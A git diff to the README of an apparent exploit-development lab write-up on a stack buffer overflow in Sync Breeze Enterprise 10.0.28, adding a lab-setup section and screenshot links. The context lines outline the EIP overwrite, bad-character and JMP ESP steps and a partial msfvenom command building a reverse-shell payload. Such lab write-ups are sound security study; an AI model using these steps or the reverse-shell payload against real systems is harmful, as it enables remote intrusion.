@@ -27,13 +27,28 @@ The objective of this project was to better understand:
 
 ---
 
+## 1. Lab Setup
+
+The first step consisted of installing
+`Sync Breeze Enterprise 10.0.28`
+inside a Windows 10 virtual machine configured for vulnerability
+research and exploit development purposes.
+
+The environment was isolated to ensure safe and controlled testing.
+
+Both virtual machines (target and attacker) were configured using
+Bridged Network Adapter mode in order to allow direct network
+communication between the systems during the exploitation process.
+
+---
+
+
 ## Methodology
 
 ### 1. Information Gathering
 
-A controlled lab environment was created using the same vulnerable
-software version. Debugging tools were configured to analyze the
-application behavior during runtime.
+Debugging tools were configured to analyze the application behavior
+during runtime and observe the crash conditions.
 
 ---
 
@@ -72,6 +87,10 @@ Where:
 - `<SIZE>` = payload length discovered during fuzzing
 - `<EIP_VALUE>` = 4-byte value observed overwriting EIP
 
+#### EIP Control Screenshot
+
+![EIP Control](screenshots/eip_control.png)
+
 ---
 
 ### 5. Bad Character Analysis
@@ -101,6 +120,10 @@ Searching for `JMP ESP`:
 Preference was given to application-specific DLLs due to the presence
 of static memory addresses.
 
+#### Mona JMP ESP Screenshot
+
+![Mona JMP ESP](screenshots/mona_jmp_esp.png)
+
 ---
 
 ### 7. Execution Testing
@@ -121,6 +144,10 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<PORT> EXITFUNC=thr
 A NOP sled (`\x90`) was added before the shellcode to improve payload
 execution reliability.
 
+#### Payload Execution Screenshot
+
+![Payload Execution](screenshots/shell.png)
+
 ---
 
 ### 9. Final Exploit Development
@@ -128,7 +155,6 @@ execution reliability.
 The final exploit was assembled and tested successfully inside the
 isolated lab environment.
 
----
 
 ## Disclaimer
 
